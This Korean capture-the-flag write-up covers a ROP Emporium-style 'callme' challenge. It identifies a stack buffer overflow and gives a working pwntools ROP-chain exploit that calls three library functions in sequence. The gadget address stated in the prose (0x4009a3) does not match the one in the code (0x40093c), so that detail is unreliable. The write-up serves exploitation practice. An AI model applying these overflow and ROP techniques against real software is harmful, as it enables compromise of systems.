### 🍞 개념

---

### 🔎 코드 분석

---

<img width="1008" height="306" alt="image" src="https://github.com/user-attachments/assets/b3bf408c-46b5-4f4f-8bee-0041609a06ac" />

NX만 적용되어 있음

Partial RELRO이기 때문에 GOT overwrite 가능

info function으로 함수 목록 확인

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/355559e9-cc04-4b32-847c-1bcd191ab16b" />

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/a35d571e-67a0-4810-ba67-e695a36fa8dd" />

`pwnme` 함수에서 `read` 근처 오버플로우가 가능한 것으로 보인다

버퍼는 `0x20`인데 `0x200`만큼 입력받을 수 있는 것으로 보인다

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/4f84bb1a-6f07-4544-9fe2-fdd5584b2f58" />

`callme_one`, `callme_two`, `callme_three`를 순서대로 호출해야 한다고 한다

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/07e549f3-870b-4a31-963f-4bae91828257" />

<img width="1410" height="610" alt="image" src="https://github.com/user-attachments/assets/40076cd4-8daa-4852-a229-7a82ba1a81ed" />


### 🗡️ 익스플로잇
---

<img width="1134" height="268" alt="image" src="https://github.com/user-attachments/assets/b3230748-2cee-441d-bfad-68196bccdc46" />

`pop rdi; pop rsi; pop rdx; ret` 가젯이 `0x4009a3` 에 존재한다

```python
from pwn import *

p = process('./callme')
elf = ELF("./callme")

callme_one = elf.plt['callme_one']
callme_two = elf.plt['callme_two']
callme_three = elf.plt['callme_three']

one = 0xdeadbeefdeadbeef
two = 0xcafebabecafebabe
three = 0xd00df00dd00df00d

pop = 0x40093c

payload = b'A'*0x20 + b'B'*8

payload += p64(pop)
payload += p64(one) + p64(two) + p64(three)
payload += p64(callme_one)

payload += p64(pop)
payload += p64(one) + p64(two) + p64(three)
payload += p64(callme_two)

payload += p64(pop)
payload += p64(one) + p64(two) + p64(three)
payload += p64(callme_three)

p.sendline(payload)

p.interactive()
```

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/7b661b50-0c52-4564-ba1e-b78ce54935dd" />
